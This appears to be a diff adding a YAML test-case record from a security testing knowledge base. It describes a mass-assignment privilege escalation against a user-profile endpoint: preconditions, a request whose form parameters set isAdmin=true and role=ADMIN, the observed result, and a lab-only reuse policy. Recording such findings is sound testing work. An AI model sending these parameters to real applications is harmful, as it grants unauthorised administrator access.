@@ -1,0 +1,20 @@
+case_specific: true
+preconditions:
+  - POST /api/users/profile accepts form or query parameters bound to UserEntity
+  - caller is authenticated non-admin
+  - isAdmin / role properties have public setters
+request_context:
+  endpoint: POST /api/users/profile
+  content_type: application/x-www-form-urlencoded
+  parameters:
+    - displayName=attacker
+    - email=a@example.com
+    - isAdmin=true
+    - role=ADMIN
+observed_result:
+  - persisted user has isAdmin=true or role=ADMIN
+  - subsequent requests may exercise admin functionality
+reuse_policy:
+  - reference_only
+  - do_not_execute_without_rederiving_from_current_target
+  - use_lab_accounts_only
